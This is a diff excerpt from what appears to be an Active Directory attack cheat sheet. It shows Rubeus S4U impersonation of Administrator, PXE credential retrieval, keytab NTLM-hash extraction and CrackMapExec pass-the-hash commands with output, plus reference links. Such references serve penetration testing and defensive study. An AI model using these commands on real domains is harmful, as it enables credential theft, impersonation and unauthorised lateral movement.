+    .\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap
 
     [*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'
     [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)
@@ -1485,7 +1934,7 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     PS > Get-PXECreds -InterfaceAlias « lab 0 » 
 
     # Wait for the DHCP to get an address
-    >> Get a valid IP adress
+    >> Get a valid IP address
     >>> >>> DHCP proposal IP address: 192.168.22.101
     >>> >>> DHCP Validation: DHCPACK
     >>> >>> IP address configured: 192.168.22.101
@@ -1594,9 +2043,20 @@ $ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
 [26] Service principal: host/COMPUTER@DOMAIN
 	 KVNO: 25
 	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Key: 31d6cfe0d16ae931b73c59d7e0c089c0
 	 Time stamp: Oct 07,  2019 09:12:02
 [...]
+```
+
+On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.
+
+```powershell
+$ python3 keytabextract.py krb5.keytab 
+[!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck
+[+] Keytab File successfully imported.
+        REALM : DOMAIN
+        SERVICE PRINCIPAL : host/computer.domain
+        NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky
 ```
 
 On macOS you can use `bifrost`.
@@ -1608,12 +2068,9 @@ On macOS you can use `bifrost`.
 Connect to the machine using the account and the hash with CME.
 
 ```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "31d6cfe0d16ae931b73c59d7e0c089c0" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0  
 ```
-
-
-
 
 ## References
 
@@ -1635,6 +2092,7 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
 * [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
 * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
+* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
 * [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
 * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
 * [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
@@ -1685,3 +2143,6 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
 * [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
+* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
+* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
+* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
